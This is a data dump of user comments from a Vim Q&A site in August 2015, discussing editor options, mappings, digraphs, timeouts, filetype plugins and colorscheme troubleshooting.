  <row Id="6132" PostId="4190" Score="0" Text="Maybe it has something to see with your `formatoptions`? What's the result of `set fo?` on your system?" CreationDate="2015-08-07T08:06:08.800" UserId="1841" />
  <row Id="6133" PostId="4190" Score="0" Text="@statox With my vimrc : `formatoptions=tcq` and without : `=tcqln`&#xA;@Carpetsmoker : it clearly come from an option in my vimrc, thanks for the advice again." CreationDate="2015-08-07T08:09:58.810" UserId="1821" />
  <row Id="6134" PostId="4190" Score="0" Text="That's the default value so probably not the source of the problem. Btw `:h fo-table` indicates that the option `l` is `Long lines are not broken in insert mode: When a line was longer than 'textwidth' when the insert command started, Vim does not automatically format it.` but as I said that might not be relevant)" CreationDate="2015-08-07T08:14:54.047" UserId="1841" />
  <row Id="6135" PostId="4190" Score="0" Text="@statox: yup exactly, removing the `l` flag solved the issue." CreationDate="2015-08-07T08:16:19.567" UserId="1821" />
  <row Id="6136" PostId="4194" Score="0" Text="I don't think that `formatoptions` and paste mode disable insert mode mappings, or I'd be interested to see the relevant documentation." CreationDate="2015-08-07T08:32:32.987" UserId="1841" />
  <row Id="6137" PostId="4194" Score="0" Text="Only paste mode disables mappings while it is on. Sorry if my writing was unclear." CreationDate="2015-08-07T08:38:26.020" UserId="2283" />
  <row Id="6138" PostId="4194" Score="0" Text="For `paste` - `:h 'paste'`: &quot;[...] 	When the 'paste' option is switched on (also when it was already on): - mapping in Insert mode and Command-line mode is disabled [...]&quot;" CreationDate="2015-08-07T08:38:32.013" UserId="1800" />
  <row Id="6139" PostId="4194" Score="0" Text="@ZeroKelvinKeyboard: No problem maybe it my reading which was unclear ;-) And thanks @ VanLaser for the doc!" CreationDate="2015-08-07T08:42:38.373" UserId="1841" />
  <row Id="6140" PostId="4194" Score="0" Text="@statox -you're welcome :) And I only found out about it while dealing with undo: http://vi.stackexchange.com/a/3865/1800 (in comments)" CreationDate="2015-08-07T08:51:52.633" UserId="1800" />
  <row Id="6141" PostId="4197" Score="0" Text="Perhaps &lt;Tab&gt; is not so special, after all ... (it's equivalent to `&lt;C-I&gt;`, so you actually insert `&lt;C-K&gt;&lt;C-I&gt;`. &lt;S-Tab&gt; works btw." CreationDate="2015-08-07T10:46:40.063" UserId="1800" />
  <row Id="6142" PostId="4197" Score="0" Text="I probably should have specified: nothing works in my config. Not `&lt;Tab&gt;` nor `&lt;S-Tab&gt;`, nor the example provided in the docs. I'm definitely missing something." CreationDate="2015-08-07T10:52:46.357" UserId="3079" />
  <row Id="6143" PostId="4197" Score="0" Text="Try `ctrl-k` `up arrow`, does that work? Perhaps add your OS, vim/gvim build details etc. to the post. And `S` is Shift (just to be sure)." CreationDate="2015-08-07T11:00:13.397" UserId="1800" />
  <row Id="6144" PostId="4197" Score="0" Text="I got it partially working by enabling the `digraph` option in my vimrc. Now the arrow keys show up properly, as does `&lt;S-Tab&gt;`. The example in the docs, `&lt;S-Space&gt;` still doesn't show up, nor do other common chords like `&lt;C-W&gt;` or `&lt;C-H&gt;`. Updating my question with more details." CreationDate="2015-08-07T11:13:54.507" UserId="3079" />
  <row Id="6145" PostId="4198" Score="1" Text="I see, thank you for clearing things up for me. That's pretty poorly documented though. I've found mention of this feature in `ins-special-keys`, a section that lists all the chars that have a special meaning in insert mode, including `&lt;C-K&gt;` for digraphs. I wasn't expecting there was another section just a little further ahead named `ins-special-special` listing special *special* characters, and that those are the only ones you can have literally printed in digraph mode. A quick headsup and an hyperref linking the two sections in the docs would be a good thing." CreationDate="2015-08-07T12:21:31.860" UserId="3079" />
  <row Id="6147" PostId="4196" Score="3" Text="Rather than use the function to do this, you could use `:global` with the pattern and the command `norm I&gt;&gt;&gt;`. The whole command would be `:g/[-+*/%()]\|import/norm I&gt;&gt;&gt;`." CreationDate="2015-08-07T12:36:09.067" UserId="1672" />
  <row Id="6148" PostId="4198" Score="0" Text="Indeed, it's almost like the 2nd *special* was added at a later time." CreationDate="2015-08-07T13:00:34.127" UserId="1800" />
  <row Id="6149" PostId="4104" Score="0" Text="You example `syntax` command seems to work, as it is in the answer. The word `*ratchet` gets highlighted as a keyword (brown-isn in my case), and the tab just before it is also highlighted (which is only visible when you move the cursor over it). How did you try to apply the `:syntax` rule?" CreationDate="2015-08-07T13:13:05.743" UserId="51" />
  <row Id="6150" PostId="4196" Score="0" Text="@SakariCajanus, That sounds good, but I need something that I can reuse easily." CreationDate="2015-08-07T13:17:25.920" UserId="3085" />
  <row Id="6151" PostId="4210" Score="0" Text="Using `redir @n` will clobber the `@n` register. Why not use a local variable with `redir =&gt; ls_output`? IMHO scripts/functions should never cause side-effects such as clobbering registers unless that's what they're designed to do." CreationDate="2015-08-07T13:52:02.747" UserId="51" />
  <row Id="6152" PostId="4165" Score="0" Text="In addition to [`:h ins-special-keys`](http://vimdoc.sourceforge.net/htmldoc/insert.html#ins-special-keys), check out [`:h ins-special-special`](http://vimdoc.sourceforge.net/htmldoc/insert.html#ins-special-special) for more mappings." CreationDate="2015-08-07T14:09:19.400" UserId="2680" />
  <row Id="6153" PostId="4210" Score="0" Text="@Carpetsmoker you're right I updated my answer. Thanks for your comment! :-)" CreationDate="2015-08-07T14:09:43.790" UserId="1841" />
  <row Id="6154" PostId="4184" Score="0" Text="I remember a colour scheme specifically designed for printing, from a few years ago.  Not sure what happened to it though.  Personally I'm using `a2ps` for printing code, it fills the bill pretty well." CreationDate="2015-08-08T05:30:12.323" UserId="2313" />
  <row Id="6155" PostId="4211" Score="6" Text="If you value your sanity, it's a good idea to give up on end line comments entirely.  `&quot;` is used as both a string delimiter and a comment character, and thus its exact meaning depends on the context.  Now, this wouldn't be a problem in a normal language.  However, VimL is weird at best.  End line comments can create problems that are really hard to debug." CreationDate="2015-08-08T11:16:38.587" UserId="2313" />
  <row Id="6156" PostId="4122" Score="0" Text="This should also work in Vim 7.4. Are you sure that you have the `autoread` option set?" CreationDate="2015-08-08T11:27:26.960" UserId="51" />
  <row Id="6157" PostId="4227" Score="1" Text="The code for this can be found in the `ex_filetype()` function in `src/ex_docmd.c`. There doesn't seem to be a lot of magic going on." CreationDate="2015-08-08T12:32:13.903" UserId="51" />
  <row Id="6158" PostId="4212" Score="0" Text="The answer to (1) is indeed that you can't in Vim (IIRC it's planned for Neovim). But you can in some terminal emulators: see the second half of http://vi.stackexchange.com/questions/3225/disable-esc-but-keep-c/3570#3570. What terminal emulator do you use? (If you use GVim, you're back to “sucker”.)" CreationDate="2015-08-08T12:43:40.870" UserId="8" />
  <row Id="6159" PostId="4212" Score="0" Text="@Gilles I'm actually using Neovim (git HEAD version) in a tmux session in Termite (a VTE based terminal)." CreationDate="2015-08-08T13:08:23.307" UserId="267" />
  <row Id="6160" PostId="4212" Score="0" Text="VTE? Nope, [sucker](http://unix.stackexchange.com/questions/191527/bash-wrong-key-sequence-bindings-with-controlaltspace/191710#191710)." CreationDate="2015-08-08T13:10:32.130" UserId="8" />
  <row Id="6161" PostId="4184" Score="0" Text="This one could be used for B/W printing, I think: https://github.com/plan9-for-vimspace/acme-colors" CreationDate="2015-08-08T16:25:13.123" UserId="1800" />
  <row Id="6162" PostId="4196" Score="1" Text="The first thought I had when reading your question was that all you need is a global substitution. Similar to Sakari's approach but without vim's specific *norm*, e.g.: `:g/[-+*/%()]\|import/s/^/&gt;&gt;&gt;/`. (And yes, you can reuse that command as well, you don't need a complex function.)" CreationDate="2015-08-08T17:31:15.847" UserId="2479" />
  <row Id="6164" PostId="4232" Score="0" Text="`sudo echo $TERM` will always print the same value as `echo $TERM` - the variable is expanded before `sudo` comes into play. What does `sudo $SHELL -c 'echo $TERM'` say? How did you install the colour scene? And you should use `sudoedit` instead of `sudo vim`." CreationDate="2015-08-08T21:36:22.563" UserId="205" />
  <row Id="6165" PostId="4137" Score="0" Text="See also @Gilles answer here: http://vi.stackexchange.com/questions/3225/disable-esc-but-keep-c/3570#3570  (didn't see his answer when I posted this one, but covers much the same info and is better formatted and has better details)" CreationDate="2015-08-09T02:59:01.180" UserId="227" />
  <row Id="6166" PostId="4232" Score="0" Text="maybe as a sudo its not loading the right vimrc? Try &quot;source &lt;pathtoyourvimrc&gt;&quot;." CreationDate="2015-08-09T06:54:09.667" UserId="3003" />
  <row Id="6167" PostId="4232" Score="0" Text="@muru `sudo $SHELL -c 'echo $TERM'` gives me the same value of &quot;screen-256color&quot;. I installed the colorscheme by copying `jellybeans.vim` file into the folder `/usr/share/vim/vim74/colors`. Thank you for `sudoedit` tip." CreationDate="2015-08-09T09:30:12.290" UserId="1067" />
  <row Id="6168" PostId="4234" Score="0" Text="I don't hink only root .vimrc file is used when running `sudo vim`. Just now i deleted root's .vimrc file and my keys/plugins defined in my user's .vimrc still work when running `sudo vim`. (when i log as root first and then run vim, they don't work). When i run `scriptnames` i see `jeelybeans.vim` only with `sudo vim` not with `vim`." CreationDate="2015-08-09T09:48:42.220" UserId="1067" />
  <row Id="6169" PostId="4232" Score="1" Text="@philolo1 i think `sudo vim` loads my local .vimrc because i deleted root's .vimrc and all my plugins/keys work as the should. I tried `source /home/kossak/.vimrc` but it doesn't change anything." CreationDate="2015-08-09T09:53:02.150" UserId="1067" />
  <row Id="6170" PostId="4234" Score="0" Text="this `:scriptnames` led me to solution - `jellybeans.vim` file was lacking read permission for &quot;others&quot;. Modify your answer so i can mark it as solution. Thank you :)" CreationDate="2015-08-09T09:56:15.503" UserId="1067" />
  <row Id="6171" PostId="4235" Score="1" Text="you can use `:wa` to make sure there aren't any unsaved files." CreationDate="2015-08-09T14:06:15.873" UserId="342" />
  <row Id="6172" PostId="4235" Score="2" Text="really, it's much &quot;saner&quot; to make sure all your files are saved before you `git commit` ..." CreationDate="2015-08-09T16:29:53.473" UserId="1800" />
  <row Id="6173" PostId="4234" Score="0" Text="Thank you, but I don't think my answer was the solution. In fact, after reading your solution and re-reading your question, I see that I misunderstood your question." CreationDate="2015-08-09T17:09:16.280" UserId="2055" />
  <row Id="6174" PostId="4241" Score="0" Text="Did you noticed that, when you remove the `&lt;leader&gt;` from the mapping, you have no problem calling the function at the right column ? While digging, I yet found nothing about your problem though ..." CreationDate="2015-08-09T22:22:20.920" UserId="1821" />
  <row Id="6175" PostId="4241" Score="0" Text="Also, what do you expect to achieve while calling your function with a range ?" CreationDate="2015-08-09T22:29:53.093" UserId="1821" />
  <row Id="6176" PostId="4241" Score="0" Text="See `:h func-range`. By using `range`, the function will be called *only once*." CreationDate="2015-08-09T22:51:29.447" UserId="1800" />
  <row Id="6178" PostId="4242" Score="1" Text="... but, you're right about `:2call TestCursor...` - I can solve it by using `:&lt;C-u&gt;call TestCursor ...&gt;` (edited your answer a little)." CreationDate="2015-08-09T22:57:21.690" UserId="1800" />
  <row Id="6179" PostId="4243" Score="1" Text="Can you expand on the trick by summarizing the link? A plain link is not very useful if the site goes down or dies." CreationDate="2015-08-10T02:18:01.593" UserId="205" />
  <row Id="6180" PostId="4231" Score="0" Text="I'll try this solution too. For the moment I'm giving a try to ctrl-space mentionned by VanLaser in the comment, which is pretty good. I'll see which solution is the most convenient. Also +1 for the altercmd plugin which is pretty cool!" CreationDate="2015-08-10T08:09:41.137" UserId="1841" />
  <row Id="6181" PostId="4244" Score="1" Text="Because they are evil and enjoy messing things up?" CreationDate="2015-08-10T08:10:06.703" UserId="622" />
  <row Id="6182" PostId="4240" Score="0" Text="Indeed VanLaser mentionned it in the comments and I didn't look at it close enough at first but it seems to be really good, I've been trying it for a few days now." CreationDate="2015-08-10T08:11:03.420" UserId="1841" />
  <row Id="6183" PostId="4245" Score="0" Text="Record a macro in a register, with `q`. Then, paste the register content to a file. `:h -w` hints to the `complex-repeat` section, which actually describes the Vim macro system. In general, you read `:h starting.txt` and hope to find there and indication to the corresponding `vimrc` option :)" CreationDate="2015-08-10T11:54:12.753" UserId="1800" />
  <row Id="6184" PostId="4245" Score="0" Text="Hello, I saw this it could be a workaround but I don't find it satisfying... Meanwhile I updated my question to make it more generic" CreationDate="2015-08-10T11:56:33.343" UserId="1821" />
  <row Id="6185" PostId="4245" Score="4" Text="As far as I know, you can't. But you can create a shell alias, which has *roughly* the same effect." CreationDate="2015-08-10T12:05:19.680" UserId="51" />
  <row Id="6186" PostId="4245" Score="0" Text="I didn't wanted to do so ... but I might find that I have no other choice ... What do you think about creating a script that would reload vim with appropriated flags ?" CreationDate="2015-08-10T12:06:09.700" UserId="1821" />
  <row Id="6187" PostId="4232" Score="0" Text="Please don't add solutions to your answer. Mark your answer as accepted. There might be a timeout, but you can accept your own answers." CreationDate="2015-08-10T12:56:39.813" UserId="205" />
  <row Id="6188" PostId="4233" Score="0" Text="I'm not sure to really see what you're trying to do but have you tried to put this line in your vimrc `let python_highlight_all = 1`? Also for enhanced python highlightinh see [here](http://www.vim.org/scripts/script.php?script_id=790)" CreationDate="2015-08-10T13:14:14.627" UserId="1841" />
  <row Id="6189" PostId="4245" Score="1" Text="I'm not sure if that's possible from Vim. You can use `!` and `system()`, but both will leave the original process in place (it doesn't replace the original Vim process). You could do it with a wrapper shell script of course, but that doesn't seem easier than a shell alias." CreationDate="2015-08-10T13:27:22.757" UserId="51" />
  <row Id="6190" PostId="4245" Score="0" Text="Imagine a program that, when started with the `-s` flag, acts as a server, and, without it, will start as a client. It is not *necessary* that the program would always be written in such a way that the client could become a server, or viceversa, *while running*." CreationDate="2015-08-10T13:57:06.763" UserId="1800" />
  <row Id="6191" PostId="4245" Score="0" Text="I perfectly understand your point, but I think, as the desired effect only affect Vim, I didn't want to use external configuration. The idea behind all this was to make a plugin that be self-sufficient." CreationDate="2015-08-10T14:20:17.197" UserId="1821" />
  <row Id="6192" PostId="4245" Score="0" Text="I can understand why you'd want to enable that feature from your ~/.vimrc rather than from the command line, but in looking through the Vim source, the only way to enable that feature is with the `-w` flag." CreationDate="2015-08-10T15:37:17.147" UserId="2055" />
  <row Id="6193" PostId="4233" Score="0" Text="What I meant was, the regular expression within the url function call up there should receive its own syntax highlighting, marking e.g. groupings in one colour, colour the parentheses, the asterisk, etc. Not just highlight it in one colour as a string (and maybe a second colour for &quot;\n&quot;, &quot;\r&quot; etc.). python_highlight_all does nothing and I cannot find it in the help system. The linked enhanced python highlighting also doesn't do this." CreationDate="2015-08-10T15:48:35.950" UserId="3098" />
  <row Id="6194" PostId="4233" Score="0" Text="Ok, so I'd say that what you want is to extend the highlighting so maybe this link explaining [how to create your own syntax file](http://vim.wikia.com/wiki/Creating_your_own_syntax_files) could help (basically it explains how to match some regex and color them the way you want). Otherwise sorry if that didn't help." CreationDate="2015-08-10T16:00:46.763" UserId="1841" />
  <row Id="6195" PostId="4249" Score="3" Text="I always thought `Ctrl-N` was for _next_, and `Ctrl-P` was for _previous_. That's what they stand for in Emacs, anyway, in which they are bound to `next-line` and `previous-line`. Also, `Ctrl-P` is not _shift in_; it is [_data link escape_](https://en.wikipedia.org/wiki/C0_and_C1_control_codes#DLE). _Shift in_ is `Ctrl-O`." CreationDate="2015-08-10T17:24:08.113" UserId="2680" />
  <row Id="6196" PostId="4249" Score="0" Text="@Lithis I stand corrected." CreationDate="2015-08-10T17:25:38.540" UserId="205" />
  <row Id="6197" PostId="4249" Score="2" Text="@Lithis Honestly, the only thing I know about Emacs is c-x c-e." CreationDate="2015-08-10T17:28:09.147" UserId="205" />
  <row Id="6198" PostId="4246" Score="0" Text="Are you sure they were using the default `Ctrl-J` binding?  It seems to be common, at least among those I know, to map `Ctrl-J/K` to &quot;down/up until the next line with the same indentation level as the starting line&quot;." CreationDate="2015-08-10T17:31:44.343" UserId="3127" />
  <row Id="6199" PostId="4237" Score="1" Text="Well, Vim's swap files are hidden files (leading `.` in the filename) so the right pattern would be `.*.sw[a-p]` (although in pathological cases, you could actually get all the way to `.foo.saa`).  That should also preclude matching Flash files, since I doubt those would typically be a hidden file." CreationDate="2015-08-10T18:33:50.387" UserId="15" />
  <row Id="6200" PostId="4237" Score="0" Text="@jamessan The leading `.` is required in a shell glob, but `*.swp` works as an argument to `find`. But the leading `.` makes things simpler. Thanks!" CreationDate="2015-08-10T18:47:32.917" UserId="2680" />
  <row Id="6201" PostId="4252" Score="2" Text="The question is, I guess, why isn't it already there, in OP case?" CreationDate="2015-08-10T19:09:51.247" UserId="1800" />
  <row Id="6202" PostId="4251" Score="2" Text="It works on my gVim (version 7.4-798). What's the result of running `:set ft?` and `:set comments?`. What's your Vim version? Do you have `:filetype plugin indent on` in your vimrc ?" CreationDate="2015-08-10T19:09:53.683" UserId="1800" />
  <row Id="6203" PostId="4252" Score="0" Text="@VanLaser I don't know, maybe my vimrc or existing plugins messed with it (if it was supposed to?) It solves the issue, though. Thank you all!" CreationDate="2015-08-10T19:11:12.633" UserId="3128" />
  <row Id="6204" PostId="4251" Score="0" Text="I don't have that, VanLaser. I actually have `&quot;filetype plugin on&#xA;` commented, I recall actively doing so for some reason I don't remember. `set ft?` gives `haskell`, and `set comments` gives `comments=s1:/*,mb:*,ex:*/,://,b:#,:%,:XCOMM,n:&gt;,fb:-` (before Lithis's answer)." CreationDate="2015-08-10T19:13:01.203" UserId="3128" />
  <row Id="6205" PostId="4251" Score="0" Text="Yes, no wonder the comments aren't recognized ... :)" CreationDate="2015-08-10T19:16:57.293" UserId="1800" />
  <row Id="6207" PostId="4251" Score="2" Text="Okay I see the `filetype plugin` is what VIM uses for filetype based comments." CreationDate="2015-08-10T19:22:09.293" UserId="3128" />
  <row Id="6208" PostId="4246" Score="4" Text="I'd like to answer to &quot; Why are there 5 ways to go down and only 3 to go up?&quot; Well - it's because, in life, things *go south* way easier! :)" CreationDate="2015-08-10T19:30:36.007" UserId="1800" />
  <row Id="6209" PostId="4210" Score="0" Text="I want to apologize: I haven't forgotten about this. Life happened. Thank you so much statox and Carpetsmoker for writing this out. The redirection is very useful. I am catching up with vim script. joeytwiddle's solution is almost what I wanted. Vimscript is so great. I was using http://learnvimscriptthehardway.stevelosh.com/ for script lessons, but I like statox's tutorial. Just have to catch up with this." CreationDate="2015-08-11T00:57:51.357" UserId="3006" />
  <row Id="6210" PostId="4114" Score="0" Text="Thank you joeytwiddle. This works really well, but as you said needs some work. The formatting is off, but i've been using this in the interim - the idea definitely works well (for me at least). As I mentioned above: I don't mean any disrespect by keeping silent - was busy for a while. Thank you and let me try all this. VimScript gets funky with some tasks. ;)" CreationDate="2015-08-11T01:00:13.440" UserId="3006" />
  <row Id="6211" PostId="4210" Score="0" Text="That's ok @Serge it happens to forget :-) LearVStheHardWay really is a good learning material (considering buying the book to support the author might be a good idea btw). This post will not replace hours of reading and months of practicing but I hope it will help you to begin is something! Also if you think that one answer actually answer your question feel free to accept it by clicking the green tick under the downvote button." CreationDate="2015-08-11T05:19:52.620" UserId="1841" />
  <row Id="6212" PostId="4255" Score="0" Text="Have you set either of [`timeoutlen` or `ttimeoutlen`](http://vimdoc.sourceforge.net/htmldoc/options.html#'timeoutlen')?" CreationDate="2015-08-11T06:47:32.983" UserId="205" />
  <row Id="6213" PostId="4260" Score="0" Text="It might be nice to have a key to undo automatically back to the last unmodified state. But `:e!` is also a nice solution; these days Vim will even keep your &quot;discarded&quot; changes in the undo history." CreationDate="2015-08-11T06:52:20.170" UserId="630" />
  <row Id="6214" PostId="4249" Score="0" Text="Historical and clear answer, thanks a lot Muru! I should have thought of the ascii code of the characters the answer often lies in there." CreationDate="2015-08-11T07:59:15.067" UserId="1841" />
  <row Id="6215" PostId="4261" Score="0" Text="If you want, you can use `nnoremap q: :q` to quit when you accidentally type `q:` instead of `:q`." CreationDate="2015-08-11T07:59:34.097" UserId="51" />
  <row Id="6216" PostId="4248" Score="0" Text="Thanks for the enlighting! I greatly agree on the `&lt;CR&gt;` mapping. Also one more question: I know that those &quot;key combinations&quot; are not actually called mappings but I'm not sure how I should call them?" CreationDate="2015-08-11T08:01:52.220" UserId="1841" />
  <row Id="6217" PostId="4254" Score="0" Text="Possible duplicate : http://stackoverflow.com/a/1925046/2558252" CreationDate="2015-08-11T08:02:14.417" UserId="1821" />
  <row Id="6218" PostId="4246" Score="0" Text="@VanLaser really great answer, they should consider adding this hint in the doc! ;-)" CreationDate="2015-08-11T08:03:23.867" UserId="1841" />
  <row Id="6219" PostId="4248" Score="0" Text="That's an interesting question, I tend to call them &quot;commands&quot;." CreationDate="2015-08-11T08:17:10.090" UserId="54" />
  <row Id="6220" PostId="4248" Score="0" Text="I may be wrong but isn't &quot;command&quot; referring to the ex mode commands like `:ls`, `:substitute`, `new`, etc...?" CreationDate="2015-08-11T08:41:55.367" UserId="1841" />
  <row Id="6221" PostId="4254" Score="3" Text="What exactly are you refering to as your &quot;airline buffer&quot;? I don't understand what is resized and shouldn' be, maybe a screenshot would be useful here." CreationDate="2015-08-11T08:50:12.910" UserId="1841" />
  <row Id="6223" PostId="4248" Score="0" Text="`x` is also a &quot;command&quot;." CreationDate="2015-08-11T09:06:00.383" UserId="54" />
  <row Id="6224" PostId="4248" Score="0" Text="Indeed I just saw that the doc calls `x`, `dd`, `c`, etc &quot;commands&quot;. So you must be right, I guess that `j` or `^J` are also commands." CreationDate="2015-08-11T09:12:51.937" UserId="1841" />
  <row Id="6225" PostId="4254" Score="0" Text="@statox: Before &lt;S-j&gt;: http://postimg.org/image/5a8f56hcx/&#xA;&#xA;&#xA;Afterwards: http://postimg.org/image/cgux9tgp1/JK&#xA;&#xA;i want that the second picture isn't possible to achieve, e.g. the buffer should always stay as in picture 1." CreationDate="2015-08-11T09:20:24.890" UserId="2354" />
  <row Id="6226" PostId="4254" Score="0" Text="The second image is not found ;-) Also put the screenshots in your question (with the &quot;edit&quot; button, the editor will give you the possibility to add a screenshot that you don't have to host yourself) rather than in the comments please." CreationDate="2015-08-11T09:22:38.103" UserId="1841" />
  <row Id="6227" PostId="4248" Score="0" Text="@statox the docs call `j`, `h` etc. motions, so that's what I call them." CreationDate="2015-08-11T09:37:37.920" UserId="205" />
  <row Id="6228" PostId="4248" Score="0" Text="@muru damn you're right!" CreationDate="2015-08-11T09:48:39.427" UserId="1841" />
  <row Id="6229" PostId="4254" Score="0" Text="@Nobe4 Do you have an idea, how i could assign &quot;set wfh&quot; and &quot;set wfw&quot; to a particular buffer? I mean, i like the ability to resize the other windows/buffers." CreationDate="2015-08-11T09:51:07.170" UserId="2354" />
  <row Id="6230" PostId="4254" Score="0" Text="@toogley, maybe you should remove the link to airline (most of the user know it or can google it has it is a well know plugin) and put 2 screenshots of before/after. Also don't hesitate to circle where the problem is or something like that. Your airline seems pretty normal to me." CreationDate="2015-08-11T10:06:23.653" UserId="1841" />
  <row Id="6231" PostId="4254" Score="0" Text="Oh I think I get it: when you have 2 splitted windows you have one airline at the bottom of each window and you would like to have only one at the bottom of your screen. Am I right?" CreationDate="2015-08-11T10:06:52.973" UserId="1841" />
  <row Id="6232" PostId="4050" Score="0" Text="@joeytwiddle I saw your comment just now after posting an answer with such a function. Is it like what you had in mind?" CreationDate="2015-08-11T10:39:15.500" UserId="1306" />
  <row Id="6233" PostId="4261" Score="0" Text="I like how all the commands in the command line window screenshot are concerned with quitting vim." CreationDate="2015-08-11T10:47:17.927" UserId="21" />
  <row Id="6234" PostId="4254" Score="0" Text="I think it's simply that his statusline moves up, and the cmd line height grows, while the single window shrinks." CreationDate="2015-08-11T11:28:40.543" UserId="1800" />
  <row Id="6235" PostId="4210" Score="0" Text="@statox I've made a rather massive edit here. It started with [the spoiler markdown](http://vi.stackexchange.com/editing-help#spoilers) (which SE does support for [code as well](http://meta.stackexchange.com/questions/105735/how-can-i-put-a-whole-code-block-in-spoiler-text)), and some grammar fixes, but I decided to replace the list with headers too. I hope I didn't mess up the function - I removed the numbers now that they're in a spoiler." CreationDate="2015-08-11T12:11:45.313" UserId="205" />
  <row Id="6236" PostId="4210" Score="0" Text="@muru: Amazing editing job, thanks a lot! :-)" CreationDate="2015-08-11T12:43:42.980" UserId="1841" />
  <row Id="6237" PostId="4254" Score="0" Text="@VanLaser exactly." CreationDate="2015-08-11T13:00:24.853" UserId="2354" />
  <row Id="6238" PostId="4050" Score="0" Text="@jjaderberg Yes it is. Great job!" CreationDate="2015-08-11T14:30:41.783" UserId="630" />
  <row Id="6239" PostId="4260" Score="2" Text="That command is `:earlier 1f`.  The `1f` means &quot;1 previous saved state&quot;, so it will go back to the previous time you saved the file.  If the buffer is modified, then that undoes all the modifications.  If the buffer isn't modified (i.e., it is currently in a saved state), then it will go to the previous time you saved the file." CreationDate="2015-08-11T14:34:38.967" UserId="15" />
  <row Id="6240" PostId="4255" Score="0" Text="Yes and it shouldn’t matter because both keys should be affected by that setting in the same way" CreationDate="2015-08-11T15:17:39.557" UserId="390" />
  <row Id="6242" PostId="4255" Score="0" Text="I suppose this must be because `&lt;leader&gt;` always begins mappings, but `g` can begin Vim commands as well. (There's an entire section dedicated to &quot;Commands starting with `g`&quot;.) Similar effect for `]`, `q`" CreationDate="2015-08-11T16:03:51.247" UserId="205" />
  <row Id="6243" PostId="4255" Score="0" Text="i'll see if I can find other examples of keys that behave like `g` does" CreationDate="2015-08-11T16:05:57.670" UserId="390" />
  <row Id="6244" PostId="4255" Score="0" Text="Ninja'd. I added a couple of examples: `]`, `q`" CreationDate="2015-08-11T16:06:28.953" UserId="205" />
  <row Id="6245" PostId="4255" Score="0" Text="You may be on to something because `q` does do it. Same with `[`, `]`. I guess that's it. if there are built-in maps beginning with the key (and the plain key isnt bound, e.g. no `map q`) then it will wait indefinitely." CreationDate="2015-08-11T16:07:59.380" UserId="390" />
  <row Id="6246" PostId="4255" Score="0" Text="Actually, I think any normal-mode command that's specified as being followed by another key will behave like this, I think. Like `m`, `'`,  `f`/`F`/`t`,`T`, etc." CreationDate="2015-08-11T16:09:38.357" UserId="205" />
  <row Id="6247" PostId="2772" Score="0" Text="It works without problems on my Windows 10 / gVim 7.4 too." CreationDate="2015-08-11T16:39:33.637" UserId="2942" />
  <row Id="6248" PostId="4245" Score="0" Text="What exactly are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334) For instance, if you are mainly interested on recording your keystrokes could try to use recording (`q`) with some autocommand to write it to a file from time to time." CreationDate="2015-08-11T17:35:31.537" UserId="1405" />
  <row Id="6249" PostId="4122" Score="0" Text="Just checked, and yes, `autoread` is set @Carpetsmoker" CreationDate="2015-08-11T18:53:07.627" UserId="3016" />
  <row Id="6250" PostId="4255" Score="1" Text="According to `:h ttimeout` when `timeout` is off and `ttimeout` is on then Vim times out on key codes but not on mappings, could it be your situation?" CreationDate="2015-08-11T19:30:07.140" UserId="1841" />
  <row Id="6251" PostId="3908" Score="0" Text="If you `&lt;c-w&gt;=` does that fix the layout?" CreationDate="2015-08-11T20:28:49.397" UserId="248" />
  <row Id="6252" PostId="3908" Score="0" Text="i could take a look, but i've eloped with emacs/magit..." CreationDate="2015-08-11T20:30:54.073" UserId="2778" />
  <row Id="6253" PostId="4181" Score="1" Text="It is *possible*, since I have macvim installed and it never does that. I've only ever installed it using homebrew. Did you `brew link macvim` without any issues? What happens if you start macvim in an iterm instance with `mvim -v`?" CreationDate="2015-08-11T20:32:23.430" UserId="248" />
  <row Id="6255" PostId="4245" Score="0" Text="I am trying to know how can I record all characters typed inside vim (like the `-w` flag does) but without having to alias vim." CreationDate="2015-08-11T20:48:41.670" UserId="1821" />
  <row Id="6256" PostId="4258" Score="0" Text="Thanks for your reply, two questions. Do you mean that the line `shopt -s extglob` should be added into the `.bashrc` file? If I'm using windows cmd line, is there any way to achieve that?" CreationDate="2015-08-11T22:44:38.003" UserId="1080" />
  <row Id="6257" PostId="4258" Score="0" Text="Yes, `shopt -s extglob` should be added to your `~/.bashrc` because it is off by default, at least in bash 4.2.45. I don't know of anything similar in the Windows Command Prompt, but I don't know Windows very well. I use Cygwin to keep my sanity while using Windows." CreationDate="2015-08-12T00:03:37.697" UserId="2055" />
  <row Id="6258" PostId="4259" Score="0" Text="Thanks for your solution. I was looking for an easy do-it-all setting that would somehow disable all the errors. I guess it doesn't exist. What I ended up using was a combinations of if statement checks and pathogen's  `g:pathogen_disabled` variable." CreationDate="2015-08-12T04:46:42.400" UserId="1623" />
  <row Id="6259" PostId="4264" Score="0" Text="Thanks for your solution. I'm not using vim-plug unfortunately. I was able to find a pathogen-centric solution however." CreationDate="2015-08-12T04:47:48.217" UserId="1623" />
  <row Id="6260" PostId="4264" Score="0" Text="You're welcome! If your solution differs from the already existing answers don't hesitate to answer your own question it might be useful to other users :-)" CreationDate="2015-08-12T04:54:54.123" UserId="1841" />
  <row Id="6261" PostId="4264" Score="1" Text="One step ahead of you :)" CreationDate="2015-08-12T04:58:18.143" UserId="1623" />
  <row Id="6262" PostId="4279" Score="0" Text="Does your `ftplugin/text.vim` have a `if exists(&quot;b:did_ftplugin&quot;)` section at the beginning to `finish` early if some ftplugin has already been `did`? And do you set `b:did_ftplugin` in your `ftplugin/bunchofFilesFT.vim`?" CreationDate="2015-08-12T08:15:00.877" UserId="1306" />
  <row Id="6263" PostId="4280" Score="0" Text="What's wrong with `BufReadPost`? You could also use `BufReadCmd`." CreationDate="2015-08-12T08:21:47.087" UserId="51" />
  <row Id="6264" PostId="4280" Score="0" Text="I also expected `BufReadPost` and `BufReadCmd` to work, but for some reason it doesn't work. However, I found that `BufWinEnter` does work. I didn't think of trying a different event, so thanks for suggesting!&#xA;&#xA;However, the main point of the question is not which autocommand event that is appropriate, but if there is a way to make this work even when I open several buffers simultaneously. Even with `BufWinEnter` I have the same problem as described." CreationDate="2015-08-12T08:38:44.880" UserId="21" />
  <row Id="6265" PostId="4268" Score="0" Text="Thanks for your answer but as discussed in the comments, the solution I wanted should not require an alias." CreationDate="2015-08-12T09:59:10.883" UserId="1821" />
  <row Id="6266" PostId="4280" Score="0" Text="What vim version and patch level?  I know I have run into bugs in 7.4 that have been fixed in the patches." CreationDate="2015-08-12T10:15:49.403" UserId="1430" />
